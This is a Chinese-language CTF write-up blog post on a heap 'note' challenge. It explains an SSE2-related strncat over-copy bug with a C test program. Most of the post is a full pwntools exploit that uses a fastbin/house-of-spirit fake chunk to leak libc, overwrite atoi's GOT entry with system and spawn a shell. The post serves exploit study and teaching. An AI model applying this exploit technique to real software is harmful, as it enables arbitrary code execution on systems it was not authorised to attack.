---
title: fast_bin_atk_note
date: 2018-08-15 13:51:13
tags: pwn heap
layout: post
---
a simple note problem 
some interesting thing about strcat
<!--more-->

# note

主要用到了fastbin atk
也有点house of spirit

漏洞点比较坑：
```
strncat(&tmp, new_ptr + 15, 0xFFFFFFFFFFFFFFFFLL);
```

sse2的优化导致的一些问题
2019的测试脚本：
```
#include <stdio.h>
#include <memory.h>
char as[0x800];
char bs_buf[0x800];
char* bs = bs_buf + 0xF;
void make_chars(char* buf, char c, size_t n)
{
 size_t i;
 for (i = 0; i < n; ++i)
 {
  buf[i] = c;
 }
 buf[i] = 0;
}

int main()
{

 for (int i = 1; i < 0x80; ++i)
 {
  memset(as, 0, 0x800);
  make_chars(as, 'A', i);
  make_chars(bs, 'B', 0x7F - i);
  memset(bs + (0x7F - i) + 1, 'C', 8);
  strncat(as, bs, 0xFFFFFFFFFFFFFFFF);
  printf("%d:%s\n", i,as + 0x80);
 }
 return 0;
}
```
发现个别因为系统对齐的原因某些情况下会将\0后面的一些东西也copy进去
所以可以里用这个漏洞向栈上写东西
恰好溢出后可以达到一个指针ptr
ptr在函数哪内将被free
所以通过构造可以得到一个fake_chunk
    因为后面需要用show泄漏所以选择bss上ptr可以通过name和address来控制自己的size和next chunk size
free之后再次malloc回来就可以写入某些地址然后通过show来泄漏
然后可以通过hijacking atoi来getshell
exp
```
from pwn import *

p=process('./note')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level='debug'
def new(length,x):
    p.recvuntil('--->>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(length))
    p.recvuntil(':')
    p.sendline(x)

def app(id,x):
    p.recvuntil('--->>')
    p.sendline('3')
    p.recvuntil('id')
    p.sendline(str(id))
    p.recvuntil('append')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(x)

def re(id,x):
    p.recvuntil('--->>')
    p.sendline('3')
    p.recvuntil('id')
    p.sendline(str(id))
    p.recvuntil('append')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(x)

def show(id):
    p.recvuntil('--->>')
    p.sendline('2')
    p.recvuntil('id')
    p.sendline(str(id))
def debug():
	if 1:
		gdb.attach(p,'''
		b *0x400be1
		c
		''')	

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
atoi_got = 0x602088
p.readuntil("name:\n")
p.sendline("\x11"*56+'\x71')
p.readuntil("address:\n")
p.sendline(p64(0x00000020f71)*2)
t=93#sse lead a bug
new(0x80,"x"*t)
control=0x602120

app(0,"y"*(128-t)+p32(control))
atoi=0x602088
#debug()
new(0x60,p64(atoi))
show(0)
p.readuntil("is ")
data=p.readline()
data=data[:-1]
data=u64(data.ljust(8,"\x00"))
base=data-libc.symbols['atoi']
libc.address=base
log.info(hex(base))
############################HIJACK@@@@@@@@@@@@@@@@@@@@@@@@@@@
re(0,p64(libc.symbols['system']))
p.sendline("/bin/sh")
p.interactive()

```


